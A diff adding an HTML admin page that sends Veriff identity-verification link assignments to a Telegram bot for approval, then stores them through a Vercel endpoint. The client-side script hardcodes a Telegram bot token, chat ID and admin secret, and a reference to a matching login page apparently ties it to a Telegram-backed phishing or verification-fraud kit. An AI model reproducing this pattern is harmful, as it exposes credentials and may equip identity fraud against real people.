@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Admin – Assign Veriff Link</title>
+    <style>
+        * { box-sizing: border-box; font-family: system-ui, sans-serif; }
+        body {
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: #fff;
+            padding: 30px 24px 36px;
+            border-radius: 28px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        h2 {
+            color: #ff0000;
+            font-weight: 700;
+            margin-top: 0;
+            margin-bottom: 8px;
+        }
+        .sub {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .label {
+            display: block;
+            text-align: left;
+            font-weight: 500;
+            font-size: 14px;
+            color: #444;
+            margin: 16px 0 6px;
+        }
+        input {
+            width: 100%;
+            height: 48px;
+            padding: 0 14px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        input:focus {
+            border-color: #ff0000;
+        }
+        .btn {
+            width: 100%;
+            height: 52px;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 18px;
+        }
+        .btn-primary {
+            background: #ff0000;
+            color: #fff;
+        }
+        .btn-primary:disabled {
+            background: #ccc;
+            color: #888;
+            cursor: not-allowed;
+        }
+        .btn-outline {
+            background: transparent;
+            border: 2px solid #ff0000;
+            color: #333;
+        }
+        #status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            display: none;
+        }
+        .success { background: #d4edda; color: #155724; display: block; }
+        .error   { background: #f8d7da; color: #721c24; display: block; }
+        .info    { background: #d1ecf1; color: #0c5460; display: block; }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .hidden { display: none; }
+        .version {
+            margin-top: 20px;
+            color: #aaa;
+            font-size: 11px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>🔐 Assign Veriff Link</h2>
+    <p class="sub">Send a request to Telegram, then approve/decline via inline buttons.</p>
+
+    <div class="label">User ID (from your system)</div>
+    <input type="text" id="userId" placeholder="e.g., client-123" value="testuser">
+
+    <div class="label">Veriff Session URL</div>
+    <input type="url" id="veriffUrl" placeholder="https://veriff.me/..." value="https://veriff.me/demo123">
+
+    <button class="btn btn-primary" id="sendBtn">📨 Send to Telegram</button>
+    <button class="btn btn-outline" id="resetBtn">↺ Reset</button>
+
+    <div id="status"></div>
+    <div class="version">v1.0 – Telegram Admin</div>
+</div>
+
+<script>
+    // ===== TELEGRAM CONFIG (same as your login.html) =====
+    const BOT_TOKEN = '8736269489:AAFJ4LyUwUYQ9K_rKWwmY1GccWUDLFTEGsA';
+    const CHAT_ID   = '1006917440';
+    const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+    // ===== VERCEL API =====
+    const API_URL = 'https://ghana-det.vercel.app/admin/set-link';
+    const ADMIN_SECRET = 'Sup3rS3cr3t!'; // must match Vercel env
+
+    // ===== DOM =====
+    const userIdInput = document.getElementById('userId');
+    const veriffUrlInput = document.getElementById('veriffUrl');
+    const sendBtn = document.getElementById('sendBtn');
+    const resetBtn = document.getElementById('resetBtn');
+    const statusDiv = document.getElementById('status');
+
+    let pollInterval = null;
+    let isWaiting = false;
+
+    // ===== Helpers =====
+    function setStatus(text, type = 'info') {
+        statusDiv.textContent = text;
+        statusDiv.className = type;
+        statusDiv.style.display = 'block';
+    }
+
+    function clearStatus() {
+        statusDiv.style.display = 'none';
+        statusDiv.className = '';
+    }
+
+    function stopPolling() {
+        if (pollInterval) {
+            clearInterval(pollInterval);
+            pollInterval = null;
+        }
+    }
+
+    // ===== Send message to Telegram with inline buttons =====
+    async function sendTelegramMessage(userId, veriffUrl) {
+        const ts = Date.now();
+        const approveId = `approve_${ts}`;
+        const declineId = `decline_${ts}`;
+
+        const message =
+            `🔐 <b>Veriff Link Assignment Request</b>\n\n` +
+            `<b>User ID:</b> <code>${escapeHtml(userId)}</code>\n` +
+            `<b>Veriff URL:</b> <code>${escapeHtml(veriffUrl)}</code>\n\n` +
+            `Tap <b>Approve</b> to assign this link, or <b>Decline</b> to cancel.`;
+
+        try {
+            const resp = await fetch(`${API_BASE}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ Approve', callback_data: approveId },
+                            { text: '❌ Decline', callback_data: declineId }
+                        ]]
+                    }
+                })
+            });
+            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+            setStatus('📨 Request sent to Telegram. Waiting for your decision...', 'info');
+            startPolling(approveId, declineId, userId, veriffUrl);
+        } catch (err) {
+            setStatus(`❌ Failed to send: ${err.message}`, 'error');
+            sendBtn.disabled = false;
+            isWaiting = false;
+        }
+    }
+
+    // ===== Poll for callback =====
+    function startPolling(approveId, declineId, userId, veriffUrl) {
+        stopPolling();
+        let lastUpdateId = 0;
+
+        pollInterval = setInterval(async () => {
+            try {
+                const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+                const resp = await fetch(url);
+                const data = await resp.json();
+                if (!data.ok || !data.result.length) return;
+
+                for (const update of data.result) {
+                    lastUpdateId = Math.max(lastUpdateId, update.update_id);
+                    const callback = update.callback_query;
+                    if (!callback) continue;
+                    const cbData = callback.data;
+
+                    if (cbData === approveId) {
+                        stopPolling();
+                        setStatus('✅ Approved! Assigning link...', 'info');
+                        // Call Vercel API to store the link
+                        await assignLink(userId, veriffUrl);
+                        return;
+                    }
+
+                    if (cbData === declineId) {
+                        stopPolling();
+                        setStatus('❌ Declined by admin. Link not assigned.', 'error');
+                        sendBtn.disabled = false;
+                        isWaiting = false;
+                        return;
+                    }
+                }
+            } catch (err) {
+                // silent – will retry
+            }
+        }, 1500);
+    }
+
+    // ===== Call Vercel API to store the link =====
+    async function assignLink(userId, veriffUrl) {
+        try {
+            const resp = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    userId,
+                    veriffUrl,
+                    token: ADMIN_SECRET
+                })
+            });
+            const data = await resp.json();
+            if (resp.ok) {
+                setStatus(`✅ Success! Link assigned to ${userId}.`, 'success');
+            } else {
+                setStatus(`❌ API error: ${data.error || 'Unknown'}`, 'error');
+            }
+        } catch (err) {
+            setStatus(`❌ Network error: ${err.message}`, 'error');
+        } finally {
+            sendBtn.disabled = false;
+            isWaiting = false;
+        }
+    }
+
+    // ===== Escape HTML =====
+    function escapeHtml(unsafe) {
+        return unsafe.replace(/[&<>"]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            if (m === '"') return '&quot;';
+            return m;
+        });
+    }
+
+    // ===== Event handlers =====
+    sendBtn.addEventListener('click', async () => {
+        if (isWaiting) return;
+        clearStatus();
+
+        const userId = userIdInput.value.trim();
+        const veriffUrl = veriffUrlInput.value.trim();
+
+        if (!userId || !veriffUrl) {
+            setStatus('Please fill in both fields.', 'error');
+            return;
+        }
+
+        // Basic URL validation
+        try {
+            new URL(veriffUrl);
+        } catch (_) {
+            setStatus('Please enter a valid URL (starting with https://).', 'error');
+            return;
+        }
+
+        sendBtn.disabled = true;
+        isWaiting = true;
+        await sendTelegramMessage(userId, veriffUrl);
+        // sendTelegramMessage will re-enable on callback or error
+    });
+
+    resetBtn.addEventListener('click', () => {
+        stopPolling();
+        userIdInput.value = '';
+        veriffUrlInput.value = '';
+        clearStatus();
+        sendBtn.disabled = false;
+        isWaiting = false;
+    });
+
+    // Cleanup on page unload
+    window.addEventListener('beforeunload', () => {
+        stopPolling();
+    });
+
+    // Initial focus
+    userIdInput.focus();
+</script>
+</body>
+</html>
